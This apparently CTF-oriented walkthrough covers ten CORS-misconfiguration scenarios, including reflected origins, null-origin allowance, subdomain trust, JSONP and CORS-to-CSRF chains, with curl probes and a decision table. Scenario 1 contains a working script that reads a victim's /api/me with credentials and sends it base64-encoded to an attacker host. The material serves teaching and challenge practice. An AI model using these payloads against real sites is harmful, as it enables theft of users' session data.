# Scenarios — the CORS challenge, played out in full

Complete scenario walkthroughs with the decision points and the
branching — the class played rather than described.

---

## Scenario 1 — "the API reflects your Origin" — the easy win

**You see**: an Express API; `/api/me` returns `{"user":"x","flag":"F{...}"}`;
the response reflects your Origin.

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com'
#   ACAO: https://evil.com    ← reflected
#   ACAC: true                ← credentialed
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   session=...; SameSite=None; Secure   ← rides
```

**The decision**: reflected + ACAC + cookie-ride → the canonical vuln.
**The action**: build the canonical page, deliver to the bot, exfil.
**The result**: the flag lands on your listener.

```html
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

## Scenario 2 — "the check is a strict allowlist, but null is allowed"

**You see**: `/api/x` returns data; a foreign Origin gets a fixed ACAO.

```bash
curl -i "$BASE/api/x" -H 'Origin: https://evil.com'
#   ACAO: https://app.t.com   ← your origin NOT allowed
curl -i "$BASE/api/x" -H 'Origin: null'
#   ACAO: null  ACAC: true    ← 'null' IS allowed
```

**The decision**: a null-allowed CORS → an opaque-origin page reads.
**The action**: a data: URL or a sandboxed iframe — its Origin is 'null'.
**The result**: the bot's fetch originates 'null' → reads the flag.

## Scenario 3 — "the check trusts subdomains" — the *.t.com case

**You see**: `/api/flag` is sensitive; a foreign Origin gets a fixed ACAO
but `sub.t.com` passes.

```bash
curl -i "$BASE/api/flag" -H 'Origin: https://sub.t.com'
#   ACAO: https://sub.t.com  ACAC: true   ← the suffix is trusted
```

**The decision**: a subdomain-trust → a controlled-sub page reads.
**The action**: host the exploit on a `sub.t.com` you control — a
subdomain XSS, a takeover, or a CTF-supplied sub.

## Scenario 4 — "the endpoint is `*`, but it's sensitive" — the trap

**You see**: `/api/me` returns session data; `ACAO:*`.

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com'
#   ACAO: *  ACAC: true   ← the INVALID combo
```

**The decision**: `*`+ACAC → the browser REJECTS the credentialed fetch —
the read FAILS — this is NOT the vuln despite looking open.
**The pivot**: the `*` endpoint reads public data only — find a different
endpoint or a different class.

## Scenario 5 — "the CORS read leaks the CSRF token" — the chain

**You see**: `/api/csrf` is CORS-open and returns a token; `/api/change`
is CSRF-vulnerable (needs the token).

```bash
curl -i -b "$CJ" "$BASE/api/csrf" -H 'Origin: https://evil.com'
#   ACAO: evil.com + ACAC → the token is readable
```

**The decision**: a CORS-read → a CSRF-write chain — the read leaks the
capability the write needs.
**The action**: the page reads the token, uses it in the write.

## Scenario 6 — "no CORS, but a JSONP endpoint" — the alternate read

**You see**: `/api/me` has no ACAO — but `?callback=` wraps the JSON in JS.

```bash
curl -s -b "$CJ" "$BASE/api/me?callback=x" | head -1
#   x({"user":"y","flag":"F{...}"})
```

**The decision**: a JSONP endpoint — a `<script src>` read with no CORS
check.
**The action**: a script-tag read — the tag's cookies ride.

## Scenario 7 — "the CORS is open but the cookie is Lax" — the gate

**You see**: `/api/me` reflects + ACAC:true — but the session cookie is
`SameSite=Lax`.

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com'
#   ACAO: evil.com  ACAC: true
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   session=...; SameSite=Lax    ← doesn't attach cross-site
```

**The decision**: the CORS headers are open but the cookie doesn't ride —
a non-credentialed read only.
**The pivot**: a same-SITE-cross-origin fetch (a `app.t.com` → `api.t.com`
fetch rides a Lax cookie), or a non-cookie credential (a Bearer), or a
stored-XSS same-origin read.

## Scenario 8 — "an airgapped bot" — the data: URL solve

**You see**: a `/report` bot that can't reach attacker.com — the exploit
must live on the target or in a URL.

**The decision**: a data: URL page (Origin 'null') if the CORS allows
'null'; or a stored-XSS page (same-origin, no CORS needed); or a
write-back exfil (the data lands on the target).

## Scenario 9 — "the preflight is strict, but a simple read works"

**You see**: a custom-header fetch needs a preflight; the preflight's
ACAH doesn't allow your header.

```bash
curl -i -X OPTIONS "$BASE/api/x" -H 'Origin: evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: X-Token'
#   ACAH doesn't list X-Token → the request can't fire
```

**The decision**: a simple request (a GET, no custom headers) skips the
preflight — only the actual ACAO gates it.
**The action**: a plain `fetch(url,{credentials:'include'})` — a GET,
no custom headers.

## Scenario 10 — "the read works but there's nothing sensitive" — the empty endpoint

**You see**: the CORS is open, the read works — but `/api/me` returns
public/nonsensitive data.

**The decision**: the read works but the endpoint is wrong — the flag
is on a different endpoint. enumerate the sensitive endpoints; the
read target must carry the flag.

## The scenario-selection table

```text
reflected + credentialed     → #1 canonical
null-allowed                 → #2 opaque
subdomain-trust              → #3 sub page
*+ACAC on sensitive          → #4 the trap — pivot
a token endpoint             → #5 the chain
a JSONP endpoint             → #6 the script-tag
Lax cookie + open CORS       → #7 the gate — same-site or Bearer
an airgapped bot             → #8 data:/stored/write-back
a strict preflight           → #9 the simple read
a public endpoint            → #10 a different endpoint
```
